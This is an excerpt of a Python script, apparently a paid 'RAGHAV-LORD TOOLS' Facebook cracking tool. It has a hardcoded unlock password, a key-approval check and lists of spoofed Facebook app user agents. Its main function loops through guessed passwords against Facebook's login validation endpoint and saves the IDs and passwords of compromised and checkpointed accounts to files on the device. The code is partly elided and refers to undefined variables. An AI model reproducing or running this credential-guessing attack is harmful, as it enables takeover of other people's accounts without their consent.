...
def main():
    stored_password = "RaghavLord"  # Replace with your stored password
    ...
    while True:
        ...
        if is_password_valid(user_password, stored_password):
            ...
            print("Welcome to RAGHAV-LORD TOOLS!")
            os.system('espeak -a 300 "Welcome to Raghav-lord Tools varson 1.0.0 ..."')
            time.sleep(2)
            os.system('clear')
...
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10.0.1; Redmi Note 5 Pro Build/RD1A.201105.003.C1) [FBAN/MobileAdsManagerAndroid;FBAV/335.0.0.30.47;FBBV/489275666;FBDM/{density=2.75,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Zong;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5 Pro;FBSV/7.2;FBOP/1;FBCA/x86:armeabi-v7a",]
ua = ["Mozilla/5.0 (Linux; Android 12; 12; Infinix X6811 Build/RP1A.200720.011; wvO270U) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4495.98 Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FPro Max; 8.1.0; Android 10; Xiaomi Redmi Note 9 Pro MaxT756C) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4532.135 Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0",]
ua = ["Davik/2.1.0 (Linux; U; Android 2.3.4; GT-I9100 Build/TQ3A.956850.791) [FBAN/FB4A;FBAV/161.0.0.35165;FBBV/218104586;FBDM/{density=2.0,width=480,height=800};FBLC/en_US;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.lite;FBDV/GT-I9100;FBSV/2.3.4;nullFBCA/armeabi-v7a:armeabi;]",]
ua = ["Davik/2.1.0 (Linux; U; Android 12.0.0; 22111317I Build/TQ3A.421944.681) [FBAN/FB4A;FBAV/487.0.0.22345;FBBV/417136701;FBDM/{density=3.5,width=1080,height=2400};FBLC/en_US;FBRV/417136701;FBCR/Visible;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.lite;FBDV/22111317I;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",]
ua = ["Davik/2.1.0 (Linux; U; Android 5.0.1.0.0; SM-234 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/infinix;FBBD/infinix;FBDV/infinix;FBSV/infinix.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=525,height=1133};]",]
ua = ["[FBAN/FB4A;FBAV/52.0.0.2858;FBBV/566307[FBAN/MobileAdsManagerAndroid;FBAV/353.5.0.53.117;FBBV/20748118;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBCR/ZONG;FBMF/samsung;FBBD/samsung;FBDV/SM-K955SY;FBSV/5.1.1;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1576};FB_FW/1;]",]
ugen2=[]
ugen=[]
cokbrut=[]
...
princp=[]
try:
    prox= requests.get('https://github.com/raghavhero/Approval.txt/blob/main/Pai').text
...
def Subscraption():
    ...
    if id in r1:
        ...
        print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;33mUnActive key Not Allow \033[0;92m")
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[LORD-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}\033[0;97m•\033[0;93mLORD-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/LORD-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[{time.strftime("%H:%M")}\033[0;97m•\033[0;92mLORD-Ok] {idf} \033[0;97m• \033[0;92m{pw} ')
                #cek_apk(session,coki)
                os.system('espeak -a 300 " LORD,  Ok,  id"')
                open('/sdcard/LORD-OK.txt', 'a').write( cid+' | '+ps+' \n')
                break
